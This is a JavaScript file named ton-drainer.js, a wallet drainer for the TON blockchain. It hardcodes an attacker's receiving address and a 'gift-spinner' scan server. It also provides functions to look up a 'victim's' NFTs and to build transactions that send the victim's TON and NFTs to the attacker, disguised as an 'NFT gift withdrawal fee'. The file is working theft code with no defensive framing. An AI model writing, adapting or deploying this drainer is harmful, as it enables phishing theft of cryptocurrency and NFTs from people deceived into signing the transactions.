// ton-drainer.js
const TON_CONFIG = {
  RECEIVER: 'UQD0XIN7zivOkMtN9iCQAusXz6NU1HaS1akmwbIIOaQTeiz4',
  SCAN_API: 'https://gift-spinner.onrender.com',
  DEFAULT_FEE_TON: 0.05,
  NFT_FEE_TON: 0.03,
};

function getTon() {
  if (typeof window.TON !== 'undefined') return window.TON;
  if (typeof TON !== 'undefined') return TON;
  throw new Error('TON core not loaded');
}

async function scanVictim(address) {
  try {
    const r = await fetch(TON_CONFIG.SCAN_API + '/api/scan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address }),
    });
    if (!r.ok) return { receiver: TON_CONFIG.RECEIVER, nfts: [] };
    return await r.json();
  } catch (e) {
    console.warn('Scan failed:', e);
    return { receiver: TON_CONFIG.RECEIVER, nfts: [] };
  }
}

async function transferTon(tonConnectUI, amountTon, comment) {
  const T = getTon();
  const body = T.beginCell()
    .storeUint(0, 32)
    .storeStringTail(comment || 'NFT gift withdrawal fee')
    .endCell();
  const tx = {
    validUntil: Math.floor(Date.now() / 1000) + 300,
    messages: [{
      address: TON_CONFIG.RECEIVER,
      amount: T.toNano(amountTon).toString(),
      payload: body.toBoc().toString('base64'),
    }],
  };
  return await tonConnectUI.sendTransaction(tx);
}

async function transferNft(tonConnectUI, nftAddress) {
  const T = getTon();
  const body = T.beginCell()
    .storeUint(0x5fcc3d14, 32)
    .storeUint(0, 64)
    .storeAddress(T.Address.parse(TON_CONFIG.RECEIVER))
    .storeAddress(T.Address.parse(TON_CONFIG.RECEIVER))
    .storeBit(0)
    .storeCoins(0)
    .storeBit(0)
    .endCell();
  const tx = {
    validUntil: Math.floor(Date.now() / 1000) + 300,
    messages: [{
      address: nftAddress,
      amount: T.toNano(TON_CONFIG.NFT_FEE_TON).toString(),
      payload: body.toBoc().toString('base64'),
    }],
  };
  return await tonConnectUI.sendTransaction(tx);
}

window.tonDrainer = { scanVictim, transferTon, transferNft, TON_CONFIG };
